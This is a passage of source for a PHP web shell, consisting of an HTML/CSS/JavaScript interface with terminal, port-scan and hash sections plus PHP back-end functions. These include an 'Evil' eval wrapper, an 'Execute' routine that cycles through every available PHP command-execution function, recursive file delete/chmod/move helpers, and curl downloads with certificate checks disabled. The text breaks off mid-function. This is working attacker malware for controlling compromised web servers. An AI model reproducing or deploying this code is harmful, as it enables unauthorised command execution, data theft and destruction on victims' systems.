<link href="data:image/png;base64,AAABAAEAEBACAAAAAACwAAAAFgAAACgAAAAQAAAAIAAAAAEAAQAAAAAAQAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//wAA//8AAP//AAD//wAA//8AAP7/AAD8fwAAwAcAAMAHAACMYwAADWEAAP//AAD//wAA//8AAP//AAD//wAA" rel="icon" type="image/x-icon" />
<style type="text/css">

	<?php if(strtolower($config['themes']) == 'd4rk'): ?>
	:root {
		--background-color:#000; 
		--color:#00ff00;
		--txt-color: #fff;
		--txt-hover-color: red;
		--border-color: #222;
		--border-hover-color: #333;
		--table-odd-color : #000;
		--table-even-color : #111;
		--table-hover-color : #222;
		--button-color : #111;
		--button-hover-color : #222;
	}
	<?php endif; ?>

	<?php if(strtolower($config['themes']) == 'br34k'): ?>
	:root {
		--background-color:#fff; 
		--color:#000;
		--txt-color: #000;
		--txt-hover-color: red;
		--border-color: #111;
		--border-hover-color: #222;
		--table-odd-color : #eee;
		--table-even-color : #ddd;
		--table-hover-color : #ccc;
		--button-color : #ccc;
		--button-hover-color : #bbb;
	}
	<?php endif; ?>

	@keyframes blinker{70%{opacity:0}}
	*,html{margin:0;padding:0;line-height:1rem}
	body{background:var(--background-color);color:var(--color);font-family: 'Open Sans', sans-serif;font-size:13px}
	::-moz-selection{background:var(--color);color:var(--background-color)}
	::selection{background:var(--color);color:var(--background-color)}
	img{vertical-align:bottom}
	hr{border:1px solid var(--border-color);margin:3px 0px 0px}
	a{color:var(--color);text-decoration:none}
	a:hover{color:var(--txt-hover-color)}
	a.active{color:var(--txt-color)}
	a.action{font-size:12px;padding:2px;margin:0px;background:var(--button-color);color:var(--txt-color);border:1px solid #222;cursor:pointer;outline:none;display:inline-block}
	a.action:hover{background:var(--button-hover-color);border:1px solid var(--border-hover-color)}
	label{display:inline-block;min-width:75px;padding-right:15px}
	iframe{background:var(--txt-hover-color)}
	fieldset {border:1px solid var(--border-color);background:var(--background-color);color:var(--color);width:100%;padding:15px;box-sizing:border-box;min-height:154px}
	textarea {border:1px solid var(--border-color);background:var(--background-color);color:var(--color);width:100%;padding:15px;min-height:300px;outline:none;box-sizing:border-box;resize:none}
	input[type=submit]{background:var(--button-color);border:1px solid var(--border-color);color:var(--txt-color);line-height:25px;padding:0 10px;cursor:pointer;outline:none}
	input[type=submit]:hover{background:var(--button-hover-color);border:1px solid var(--border-hover-color)}
	input[type=text]{background:var(--background-color);line-height: 15px;color:var(--color);border:1px solid var(--border-color);width:200px;padding:5px;outline:none;box-sizing:border-box}
	input[type=number]{background:var(--background-color);line-height: 15px;color:var(--color);border:1px solid var(--border-color);width:200px;padding:5px;outline:none;box-sizing:border-box}
	input[type=file]{background:var(--background-color);line-height: 15px;color:var(--color);border:1px solid var(--border-color);width:200px;padding:2px;outline:none;box-sizing:border-box}
	select{background:var(--background-color);color:var(--color);border:1px solid var(--border-color);width:200px;padding:5px;outline:none;box-sizing:border-box}
	#wrapper{width:93%;margin:37px auto 40px}
	#info{margin:0 0 23px 0;padding:0 13px 0 0}
	#header{display:inline-block;width:100%}
	.header-left{float:left;width:66%}
	.header-right{float:right;width:34%}
	#connect{display:inline-block;width:100%}
	.connect-left{float:left;width:49%}
	.connect-right{float:right;width:49%}
	#database-session{display:inline-block;width:100%}
	.database-query{float:left;width:49%}
	.database-process{float:right;width:49%}
	#php{display:inline-block}
	.php-left{float:left;width:49%}
	.php-right{float:right;width:49%}
	.divide{width:100%;display:inline-block}
	.divide-left{float:left;width:50%}
	.divide-right{float:right;width:50%}
	.mail input[type=text]{width:100%;display:block}
	.database-breadcrumb{margin:10px 0 0;display:inline-block;font-style: italic;}
	#update{text-align:center}
	#php-configuration{text-align:center}
	.error{animation:blinker 1s linear infinite;background:var(--color);color:var(--background-color);padding:10px;margin:10px;}
	#logo{margin:0 0 23px 0;padding:23px 0 23px 0;border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-color)}
	.content{border:1px solid var(--border-color);padding:10px;overflow:auto;overflow-y:hidden}
	#process-list{padding:25px;margin:25px auto 0px;border:1px solid var(--border-color);overflow:scroll;overflow-y:hidden}
	#process-list s{text-decoration:none}
	.tools-header{margin-bottom:20px;padding-bottom:25px;text-align:center;border-bottom:1px solid var(--border-color)}
	.menu{overflow:hidden;border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-color);margin:10px 0}
	.menu > ul{list-style:none;margin:0;padding:0}
	.menu > ul > li{margin:0 3px 0 0;padding:10px 7px 10px 7px;display:block;float:left}
	.menu > ul > li:hover{cursor:pointer}
	.menu-tools{overflow:hidden;border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-color);margin:10px 0}
	.menu-tools > ul{list-style:none;margin:0;padding:0}
	.menu-tools > ul > li{margin:0 3px 0 0;padding:10px 7px 10px 7px;display:block;float:left}
	.menu-tools > ul > li:hover{cursor:pointer}
	.menu-directory{;margin-bottom:10px}
	.new{margin-right:15px;}
	.hash label{min-width:40px;display:inline-block;padding-right:15px}
	.hash-capture label{margin:10px 0;display:inline-block}
	.hash input[type=radio]{margin-right:10px;display:inline-block;vertical-align:middle}
	.auto-number table{counter-reset:row_}
	.auto-number table tbody tr td:first-child{counter-increment:row_;vertical-align:middle;text-align:center}
	.auto-number table tbody tr td:first-child::before{content:counter(row_)}
	#title{text-align:center;font-size:44px;margin:0;color:var(--txt-color);margin-bottom:15px}
	#subtitle{text-align:center;font-size:22px;margin:0;color:var(--txt-color);margin-top:8px}
	#tools{min-height:125px;padding:10px;border-radius:5px}
	#account{min-height:100px;padding:10px;border-radius:5px}
	#thanks{text-align:center;font-size:16px;font-family:courier;padding:5% 0}
	#footer{margin:25px auto}
	#copyrights{text-align:center}
	#pageload{text-align:center}
	#query{margin-top:10px}
	#database-query{overflow:auto;margin:10px 0}
	#hexdump{height:300px;overflow:auto;overflow-x:hidden}
	#terminal{min-height:100px;padding:10px;border-radius:5px}
	#terminal-input{border:none;width:480px;}
	#curdir-terminal{min-width:10px}
	#database{min-height:100px;padding:10px;border-radius:5px}
	#database label{width:100px;padding:5px;margin-right:10px;display:inline-block}
	#port-scan label{width:100px;padding:5px;margin-right:10px;display:inline-block}
	#phpinfo table{margin:25px 0}
	#phpinfo tr:nth-child(odd){background:var(--background-color)}
	#phpinfo tr:nth-child(even){background:var(--border-color)}
	#phpinfo td,th{padding:5px;border:1px solid var(--border-color)}
	#phpinfo h1{margin:10px 0}
	#phpinfo h2{margin:10px 0}
	#phpinfo.e{width:200px}
	#phpinfo.v{word-break:break-word}
	#phpinfo img{display:none}
	#phpinfo hr{border:none}
	.line h2{position:relative;top:12px;width:100px;display:inline;background:var(--background-color);padding:0 10px;color:var(--txt-color)}
	.line{border-bottom:2px solid var(--color);text-align:center;width:287px;margin:auto}
	.table {width:100%;margin:10px 0}
	.table td,th{padding:2px;border:0px solid var(--border-color);max-width:250px;min-width:25px}
	.table td.kanan{word-break:break-word}
	.table td.kiri{width:30%}
	.table tr:nth-child(odd){background:var(--table-odd-color)}
	.table tr:nth-child(even){background:var(--table-even-color)}
	.table tr:hover td{background:var(--table-hover-color)}
	.table tfoot td{padding:10px;text-align:center}
	.database-table > td.table {word-break:normal;}
	.map-switch{display:inline-block}
	.form-fix{margin:-15px 0}
	.frmsource{margin-top:10px}
	.hexdump{width:100%;padding:5px;margin-bottom:5px}
	.hexdump td{text-align:left}
	.highlight{background:var(--background-color);word-break:break-word;padding:15px;margin-bottom:5px;height:300px;overflow:auto}
	.hash-capture{display:inline-block;width:100%}
	.hash-capture-left{float:left;width:49%}
	.hash-capture-right{float:right;width:49%}
	.clr{clear:both}
	.on{color:var(--txt-color)}
	.off{color:red}
	.result{padding:10px}
	.sortable thead{cursor:pointer}
	.disablefunc{overflow-wrap:break-word}
	.loading{vertical-align:middle;width:16px;height:16px;display:inline-block;background:url('data:image/gif;base64,R0lGODlhEAAQAPIAAAAAAP///zw8PLy8vP///5ycnHx8fGxsbCH+GkNyZWF0ZWQgd2l0aCBhamF4bG9hZC5pbmZvACH5BAAKAAAAIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAEAAQAAADMwi63P4wyklrE2MIOggZnAdOmGYJRbExwroUmcG2LmDEwnHQLVsYOd2mBzkYDAdKa+dIAAAh+QQACgABACwAAAAAEAAQAAADNAi63P5OjCEgG4QMu7DmikRxQlFUYDEZIGBMRVsaqHwctXXf7WEYB4Ag1xjihkMZsiUkKhIAIfkEAAoAAgAsAAAAABAAEAAAAzYIujIjK8pByJDMlFYvBoVjHA70GU7xSUJhmKtwHPAKzLO9HMaoKwJZ7Rf8AYPDDzKpZBqfvwQAIfkEAAoAAwAsAAAAABAAEAAAAzMIumIlK8oyhpHsnFZfhYumCYUhDAQxRIdhHBGqRoKw0R8DYlJd8z0fMDgsGo/IpHI5TAAAIfkEAAoABAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAh+QQACgAFACwAAAAAEAAQAAADMwi6IMKQORfjdOe82p4wGccc4CEuQradylesojEMBgsUc2G7sDX3lQGBMLAJibufbSlKAAAh+QQACgAGACwAAAAAEAAQAAADMgi63P7wCRHZnFVdmgHu2nFwlWCI3WGc3TSWhUFGxTAUkGCbtgENBMJAEJsxgMLWzpEAACH5BAAKAAcALAAAAAAQABAAAAMyCLrc/jDKSatlQtScKdceCAjDII7HcQ4EMTCpyrCuUBjCYRgHVtqlAiB1YhiCnlsRkAAAOwAAAAAAAAAAAA==')}
</style>
<script type="text/javascript">
function dean_addEvent(t,e,r){if(t.addEventListener)t.addEventListener(e,r,!1);else{r.$$guid||(r.$$guid=dean_addEvent.guid++),t.events||(t.events={});var o=t.events[e];o||(o=t.events[e]={},t["on"+e]&&(o[0]=t["on"+e])),o[r.$$guid]=r,t["on"+e]=handleEvent}}function removeEvent(t,e,r){t.removeEventListener?t.removeEventListener(e,r,!1):t.events&&t.events[e]&&delete t.events[e][r.$$guid]}function handleEvent(t){var e=!0;t=t||fixEvent(((this.ownerDocument||this.document||this).parentWindow||window).event);var r=this.events[t.type];for(var o in r)this.$$handleEvent=r[o],!1===this.$$handleEvent(t)&&(e=!1);return e}function fixEvent(t){return t.preventDefault=fixEvent.preventDefault,t.stopPropagation=fixEvent.stopPropagation,t}var stIsIE=!1;if(sorttable={init:function(){arguments.callee.done||(arguments.callee.done=!0,_timer&&clearInterval(_timer),document.createElement&&document.getElementsByTagName&&(sorttable.DATE_RE=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,forEach(document.getElementsByTagName("table"),function(t){-1!=t.className.search(/\bsortable\b/)&&sorttable.makeSortable(t)})))},makeSortable:function(t){if(0==t.getElementsByTagName("thead").length&&(the=document.createElement("thead"),the.appendChild(t.rows[0]),t.insertBefore(the,t.firstChild)),null==t.tHead&&(t.tHead=t.getElementsByTagName("thead")[0]),1==t.tHead.rows.length){sortbottomrows=[];for(e=0;e<t.rows.length;e++)-1!=t.rows[e].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=t.rows[e]);if(sortbottomrows){null==t.tFoot&&(tfo=document.createElement("tfoot"),t.appendChild(tfo));for(e=0;e<sortbottomrows.length;e++)tfo.appendChild(sortbottomrows[e]);delete sortbottomrows}headrow=t.tHead.rows[0].cells;for(var e=0;e<headrow.length;e++)headrow[e].className.match(/\bsorttable_nosort\b/)||(mtch=headrow[e].className.match(/\bsorttable_([a-z0-9]+)\b/),mtch&&(override=mtch[1]),mtch&&"function"==typeof sorttable["sort_"+override]?headrow[e].sorttable_sortfunction=sorttable["sort_"+override]:headrow[e].sorttable_sortfunction=sorttable.guessType(t,e),headrow[e].sorttable_columnindex=e,headrow[e].sorttable_tbody=t.tBodies[0],dean_addEvent(headrow[e],"click",sorttable.innerSortFunction=function(t){if(-1!=this.className.search(/\bsorttable_sorted\b/))return sorttable.reverse(this.sorttable_tbody),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(document.getElementById("sorttable_sortfwdind")),sortrevind=document.createElement("span"),sortrevind.id="sorttable_sortrevind",sortrevind.innerHTML=stIsIE?'&nbsp<font face="webdings">5</font>':"&nbsp;&#x25B4;",void this.appendChild(sortrevind);if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))return sorttable.reverse(this.sorttable_tbody),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(document.getElementById("sorttable_sortrevind")),sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML=stIsIE?'&nbsp<font face="webdings">6</font>':"&nbsp;&#x25BE;",void this.appendChild(sortfwdind);theadrow=this.parentNode,forEach(theadrow.childNodes,function(t){1==t.nodeType&&(t.className=t.className.replace("sorttable_sorted_reverse",""),t.className=t.className.replace("sorttable_sorted",""))}),sortfwdind=document.getElementById("sorttable_sortfwdind"),sortfwdind&&sortfwdind.parentNode.removeChild(sortfwdind),sortrevind=document.getElementById("sorttable_sortrevind"),sortrevind&&sortrevind.parentNode.removeChild(sortrevind),this.className+=" sorttable_sorted",sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML=stIsIE?'&nbsp<font face="webdings">6</font>':"&nbsp;&#x25BE;",this.appendChild(sortfwdind),row_array=[],col=this.sorttable_columnindex,rows=this.sorttable_tbody.rows;for(e=0;e<rows.length;e++)row_array[row_array.length]=[sorttable.getInnerText(rows[e].cells[col]),rows[e]];row_array.sort(this.sorttable_sortfunction),tb=this.sorttable_tbody;for(var e=0;e<row_array.length;e++)tb.appendChild(row_array[e][1]);delete row_array}))}},guessType:function(t,e){sortfn=sorttable.sort_alpha;for(var r=0;r<t.tBodies[0].rows.length;r++)if(text=sorttable.getInnerText(t.tBodies[0].rows[r].cells[e]),""!=text){if(text.match(/^-?[Â£$Â¤]?[\d,.]+%?$/))return sorttable.sort_numeric;if(possdate=text.match(sorttable.DATE_RE),possdate){if(first=parseInt(possdate[1]),second=parseInt(possdate[2]),first>12)return sorttable.sort_ddmm;if(second>12)return sorttable.sort_mmdd;sortfn=sorttable.sort_ddmm}}return sortfn},getInnerText:function(t){if(!t)return"";if(hasInputs="function"==typeof t.getElementsByTagName&&t.getElementsByTagName("input").length,null!=t.getAttribute("sorttable_customkey"))return t.getAttribute("sorttable_customkey");if(void 0!==t.textContent&&!hasInputs)return t.textContent.replace(/^\s+|\s+$/g,"");if(void 0!==t.innerText&&!hasInputs)return t.innerText.replace(/^\s+|\s+$/g,"");if(void 0!==t.text&&!hasInputs)return t.text.replace(/^\s+|\s+$/g,"");switch(t.nodeType){case 3:if("input"==t.nodeName.toLowerCase())return t.value.replace(/^\s+|\s+$/g,"");case 4:return t.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(var e="",r=0;r<t.childNodes.length;r++)e+=sorttable.getInnerText(t.childNodes[r]);return e.replace(/^\s+|\s+$/g,"");default:return""}},reverse:function(t){newrows=[];for(e=0;e<t.rows.length;e++)newrows[newrows.length]=t.rows[e];for(var e=newrows.length-1;e>=0;e--)t.appendChild(newrows[e]);delete newrows},sort_numeric:function(t,e){return aa=parseFloat(t[0].replace(/[^0-9.-]/g,"")),isNaN(aa)&&(aa=0),bb=parseFloat(e[0].replace(/[^0-9.-]/g,"")),isNaN(bb)&&(bb=0),aa-bb},sort_alpha:function(t,e){return t[0]==e[0]?0:t[0]<e[0]?-1:1},sort_ddmm:function(t,e){return mtch=t[0].match(sorttable.DATE_RE),y=mtch[3],m=mtch[2],d=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt1=y+m+d,mtch=e[0].match(sorttable.DATE_RE),y=mtch[3],m=mtch[2],d=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt2=y+m+d,dt1==dt2?0:dt1<dt2?-1:1},sort_mmdd:function(t,e){return mtch=t[0].match(sorttable.DATE_RE),y=mtch[3],d=mtch[2],m=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt1=y+m+d,mtch=e[0].match(sorttable.DATE_RE),y=mtch[3],d=mtch[2],m=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt2=y+m+d,dt1==dt2?0:dt1<dt2?-1:1},shaker_sort:function(t,e){for(var r=0,o=t.length-1,n=!0;n;){n=!1;for(s=r;s<o;++s)if(e(t[s],t[s+1])>0){a=t[s];t[s]=t[s+1],t[s+1]=a,n=!0}if(o--,!n)break;for(var s=o;s>r;--s)if(e(t[s],t[s-1])<0){var a=t[s];t[s]=t[s-1],t[s-1]=a,n=!0}r++}}},document.addEventListener&&document.addEventListener("DOMContentLoaded",sorttable.init,!1),/WebKit/i.test(navigator.userAgent))var _timer=setInterval(function(){/loaded|complete/.test(document.readyState)&&sorttable.init()},10);window.onload=sorttable.init,dean_addEvent.guid=1,fixEvent.preventDefault=function(){this.returnValue=!1},fixEvent.stopPropagation=function(){this.cancelBubble=!0},Array.forEach||(Array.forEach=function(t,e,r){for(var o=0;o<t.length;o++)e.call(r,t[o],o,t)}),Function.prototype.forEach=function(t,e,r){for(var o in t)void 0===this.prototype[o]&&e.call(r,t[o],o,t)},String.forEach=function(t,e,r){Array.forEach(t.split(""),function(o,n){e.call(r,o,n,t)})};var forEach=function(t,e,r){if(t){var o=Object;if(t instanceof Function)o=Function;else{if(t.forEach instanceof Function)return void t.forEach(e,r);"string"==typeof t?o=String:"number"==typeof t.length&&(o=Array)}o.forEach(t,e,r)}};
</script>
<script type="text/javascript">
	var xhr;
	window.onload=function(){
		getFocus("terminal-input");
		getFocus("find-action");
		getFocus("sourcefocus");
		getFocus("php-code");
	};
	function getFocus(id){
		if(document.getElementById(id)!==null){
		document.getElementById(id).focus();}
	}
	function getAjax(txt,id,method,url){
		var xmlhttp;
		var urlf="";
		var data=new FormData();
		var params=url.split("&");
		for(i=0;i<params.length;i++){
		val=params[i].split("=");
		if(val[0]=='text-encode'){
		data.append(val[0],val[1]);
		}else{if(val[0].indexOf('?')<0)
		{urlf+='&'+val[0]+'='+val[1];}}}
		if(window.XMLHttpRequest){xmlhttp=new XMLHttpRequest();
		}else{xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");}
		xmlhttp.onreadystatechange=function(){
		sts=["Request Not Initialized",
		"Server Connection Established",
		"Request Received",
		"Processing Request",
		"Request Finished"];
		if(xmlhttp.readyState==4&&xmlhttp.status==200){
		if(txt){document.getElementById(id).innerHTML=xmlhttp.responseText;
		}else{document.getElementById(id).value=xmlhttp.responseText;}
		}else{
		if(txt){document.getElementById(id).innerHTML=
		"[Status] "+"Please Wait... <div class='loading'></div><br>"+
		"[State] "+sts[xmlhttp.readyState]+"<br>"+
		"[Response] "+xmlhttp.response;
		}else{document.getElementById(id).value=
		"[Status] "+"Please Wait...\n"+
		"[State] "+sts[xmlhttp.readyState]+"\n"+
		"[Response] "+xmlhttp.response;}}
		};
		xmlhttp.open(method,window.location.href+urlf,true);
		xmlhttp.send(data);
		xhr=xmlhttp;
	}
	function ajaxAbort(txt,id){
		if(txt){document.getElementById(id).innerHTML="Canceled";
		}else{document.getElementById(id).value="Canceled";}
		xhr.abort();
	}
	function checkAll(){
		for(var i=0;i<document.getElementsByName('chk[]').length;i++){
		document.getElementsByName('chk[]')[i].checked=document.getElementsByName('check-all')[0].checked;}
	}
	function checkCount(id){
		count=1;
		for(var i=0;i<document.getElementsByName('chk[]').length;i++){
		if(document.getElementsByName('chk[]')[i].checked){
		document.getElementById(id).innerHTML=count++;
		}else{document.getElementById(id).innerHTML=count-1;}}
	}
	function mapSwitch(id,id2){
		var a=document.getElementById(id);
		var b=document.getElementById(id2);
		if(a.style.display=='inline-block'){
		a.style.display='none';
		b.style.display='inline-block';
		}else{a.style.display='inline-block';
		b.style.display='none';}
	}
	function getParameter(p) {
		var searchString=window.location.search.substring(1),
		i,val,params=searchString.split("&");
		for(i=0;i<params.length;i++){
		val=params[i].split("=");
		if(val[0]==p){
		return val[1];}}
		return null;
	}
</script>
</head>
<body>
<div id="wrapper"><?php

$cur=any("c",$_SESSION)?urld($_SESSION['c']):getcwd();
$dir=any("d",$_REQUEST)?urld($_REQUEST['d']):$cur;
$map=any("r",$_REQUEST)?dirname(urld($_REQUEST['r'])):$dir;

function Unix() 
{
	return(strtolower(substr(PHP_OS,0,3))!="win");
}

function Evil($x,$y=false)
{
	$c=$y==true?"?>".$x."<?php ":$x;
	$evil=@eval($c);
	if(error_get_last())
	{
		print "\n[Error] ";
		return print_r(error_get_last());
	}
	return $evil;
}

function Execute($x)
{
	$x=$x.' 2>&1';
	if(!is_null($backtic=`$x`))
	{
		return $backtic;
	}
	elseif(function_exists('system'))
	{
		ob_start();
		$system=system($x);
		$buff=ob_get_contents();
		ob_end_clean();
		return $buff;
	}
	elseif(function_exists('exec'))
	{
		$buff="";
		exec($x,$results);
		foreach($results as $result)
		{
			$buff.=$result;
		}
		return $buff;
	}
	elseif(function_exists('shell_exec'))
	{
		$buff=shell_exec($x);
		return $buff;
	}
	elseif(function_exists('pcntl_exec'))
	{
		$buff=pcntl_exec($x);
		return $buff;
	}
	elseif(function_exists('passthru'))
	{
		ob_start();		
		$passthru=passthru($x);
		$buff=ob_get_contents();
		ob_end_clean();	
		return $buff;
	}
	elseif(function_exists('proc_open'))
	{
		$proc=proc_open($x,array(
			array("pipe","r"),
			array("pipe","w"),
			array("pipe","w")
		),$pipes);
		$buff=stream_get_contents($pipes[1]);
		return $buff;
	}
	elseif(function_exists('popen'))
	{
		$buff="";
		$pop=popen($x,"r");
		while(!feof($pop))
		{
			$buff.=fread($pop,1024);
		}
		pclose($pop);
		return $buff;
	}
	return "R.I.P Command";
}

function Remove($x)
{
	if(is_dir($x))
	{
		if($h=@opendir($x))
		{
			while(false!==($f=readdir($h)))
			{
				if($f!="."&&$f!="..")
				{
					Remove($x._.$f);
				}
			}
			closedir($h);
		}
		return rmdir($x);
	}
	elseif(is_file($x))
	{
		return unlink($x);
	}
	return false;
}

function ChmodRecursive($x,$y)
{
	if(is_dir($x))
	{
		if($h=@opendir($x))
		{
			while(false!==($f=readdir($h)))
			{
				if($f!="."&&$f!="..")
				{
					ChmodRecursive($x._.$f);
				}
			}
			closedir($h);
		}
		return chmod($x,$y);
	}
	elseif(is_file($x))
	{
		return chmod($x,$y);
	}
	return false;
}

function CopyRecursive($x,$y)
{
	if(is_dir($x))
	{
		@mkdir($y);
		if($h=@opendir($x))
		{
			while(false!==($f=readdir($h)))
			{
				if($f!="."&&$f!="..")
				{
					CopyRecursive($x._.$f,$y._.$f);
				}
			}
			closedir($h);
		}
		return true;
	}
	elseif(is_file($x))
	{
		return copy($x,$y);
	}
	return false;
}

function MoveRecursive($x,$y)
{
	if(is_dir($x))
	{
		@mkdir($y);
		if($h=@opendir($x))
		{
			while(false!==($f=readdir($h)))
			{
				if($f!="."&&$f!="..")
				{
					MoveRecursive($x._.$f,$y._.$f);
				}
			}
			closedir($h);
		}
		return Remove($x);
	}
	elseif(is_file($x))
	{
		if(copy($x,$y))
		{
			return unlink($x);
		}
	}
	return false;
}

function GetDownloadUrl($x,$y)
{
	global $agent;
	$fl=fopen($y,"w");
	$ch=curl_init();
	curl_setopt($ch,CURLOPT_USERAGENT,$agent);
	curl_setopt($ch,CURLOPT_URL,$x);
	curl_setopt($ch,CURLOPT_FILE,$fl);
	curl_setopt($ch,CURLOPT_HEADER,0);
	curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
	curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
	$rs=curl_exec($ch);
	if(curl_error($ch)) return curl_error($ch);
	curl_close($ch);
	fclose($fl);
	return true;
}

function GetUrlExists($x)
{
	global $agent;
	$ch=curl_init();
	curl_setopt($ch,CURLOPT_USERAGENT,$agent);
	curl_setopt($ch,CURLOPT_URL,$x);
	curl_setopt($ch,CURLOPT_TIMEOUT,5);
	curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,5);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	$rs=curl_exec($ch);
	$http=curl_getinfo($ch,CURLINFO_HTTP_CODE);
	if(curl_error($ch)) return curl_error($ch);
	curl_close($ch);
	return ($http>=200 && $http<300);
}

function GetUrlContent($x)
{
	global $agent;
	$ch=curl_init();
	curl_setopt($ch,CURLOPT_USERAGENT,$agent);
	curl_setopt($ch,CURLOPT_URL,$x);
	curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	$rs=curl_exec($ch);
	if(curl_error($ch)) return curl_error($ch);
	curl_close($ch);
	return $rs;
}

function GetUrlFromPath($x)
{
	$fix_path=str_replace(_,'/',$x);
	$protocol=empty($_SERVER['HTTPS'])||$_SERVER['HTTPS']==='off'?'http://':'https://';
	$path=str_replace(document_root,'',$fix_path);
	return $protocol.server_name.$path;
}

function PostUrlContent($url,$content)
{
	global $agent;
	$params=array(
		'http' => array(
			'method'  => "POST",
			'header'  => "Content-Type: application/x-www-form-urlencoded\r\n".
						 "User-Agent: $agent\r\n",
			'content' => http_build_query($content)
		)
	);
	$results="";
	$context=stream_context_create($params);
	$header=get_headers($url);
	if($http=substr($header[0],9,3) != "200")
	{
	    $results="Error: $http";
	}
	else
	{
		//file_get_contents
		if($contents=file_get_contents($url,null,$context))
		{
			$results=htmlspecialchars($contents);
		}

		//stream_get_contents
		if($handle=fopen($url,'r',false,$context)) 
		{
		    $contents=stream_get_contents($handle);
		    fclose($handle);
		    $results=htmlspecialchars($contents);
		}

		//fopen
		if($handle=fopen($url,'r',false,$context))
		{
			$contents="";
			while(!feof($handle)) 
			{
				$contents.=fread($handle,10240);
			}
			fclose($handle);
			$results=htmlspecialchars($contents);
		}

	}
	return $results;
}

function GetFileType($x) 
{
	if(is_file($x)) 
	{
		return pathinfo($x)['extension'];
	}
	elseif(is_dir($x)) 
	{ 
		return "dir";
	}
	elseif(is_link($x)) 
	{ 
		return "link";
	}
	else
	{
		return "-";
	}
}

function GetFileTime($x,$y) 
{
	switch($y) 
	{
		case "create":return date("Y-m-d H:i:s",@filectime($x));break;
		case "modify":return date("Y-m-d H:i:s",@filemtime($x));break;
		case "access":return date("Y-m-d H:i:s",@fileatime($x));break;
	}
}

function GetFilePerm($x) 
{
	$perms=@fileperms($x);
	switch ($perms & 0xF000) 
	{case 0xC000:$info='s';break;case 0xA000:$info='l';break;
	case 0x8000:$info='r';break;case 0x6000:$info='b';break;
	case 0x4000:$info='d';break;case 0x2000:$info='c';break;
	case 0x1000:$info='p';break;default:$info='u';}
	$info .=(($perms & 0x0100)?'r':'-');$info .=(($perms & 0x0080)?'w':'-');
	$info .=(($perms & 0x0040)?(($perms & 0x0800)?'s':'x' ):(($perms & 0x0800)?'S':'-'));
	$info .=(($perms & 0x0020)?'r':'-');$info .=(($perms & 0x0010)?'w':'-');
	$info .=(($perms & 0x0008)?(($perms & 0x0400)?'s':'x' ):(($perms & 0x0400)?'S':'-'));
	$info .=(($perms & 0x0004)?'r':'-');$info .=(($perms & 0x0002)?'w':'-');
	$info .=(($perms & 0x0001)?(($perms & 0x0200)?'t':'x' ):(($perms & 0x0200)?'T':'-'));
	return sprintf('%s [%s]',$info,substr(decoct($perms),2));
}

function GetFileSize($x) 
{
	$x=abs($x);
	$size=array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
	$exp=$x?floor(log($x)/log(1024)):0;
	return sprintf('%.2f '.$size[$exp],($x/pow(1024,floor($exp))));
}

function GetUser($x) 
{	
	if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')) 
	{
		$uid=posix_getpwuid(posix_getuid());
		$gid=posix_getgrgid(posix_getgid());
		
		switch($x) 
		{	
			case 'usr':return $uid['name'];break;
			case 'uid':return $uid['uid'];break;
			case 'grp':return $gid['name'];break;
			case 'gid':return $gid['gid'];break;
		}
	}
	else
	{
		switch($x)
		{
			case 'usr':return get_current_user();break;
			case 'uid':return getmyuid();break;
			case 'grp':return "?";break;
			case 'gid':return getmygid();break;
		}
	}	
}

function GetOwnerGroup($x) 
{
	if(Unix())
	{
		if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')) 
		{
			$user=posix_getpwuid(fileowner($x));
			$group=posix_getgrgid(filegroup($x));
			return sprintf('%s:%s',$user['name'],$group['name']);
		}
	}
	return "?:?";
}

function GetFileOwnerGroup($x) 
{
	if(Unix())
	{
		if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')) 
		{
			$user=posix_getpwuid(fileowner($x));
			$group=posix_getgrgid(filegroup($x));
			return sprintf('%s:%s/%s:%s',$user['name'],$user['uid'],$group['name'],$group['gid']);
		}
	}
	return "?:?/?:?";
}

function GetSafeMode() 
{
	if(strtolower(ini_get("safe_mode"))=='on') 
	{
		$safemod="<font class='off'>ON</font>";
	}
	else
	{
		$safemod="<font class='on'>OFF</font>";
	}
	return $safemod;
}

function MapDirectory($x) 
{
	$map="";
	$d=str_replace("\\",_,$x);
	if(empty($d))
	{
		$d=realpath(".");
	}
	elseif(realpath($d))
	{	
		$d=realpath($d);
	}
	$d=str_replace("\\",_,$d);
	if(substr($d,-1)!=_) 
	{	
		$d.=_;
	}
	$d=str_replace("\\\\","\\",$d);
	$pd=$e=explode(_,substr($d,0,-1));
	$i=0;
	foreach($pd as $b) 
	{
		$t="";
		$j=0;
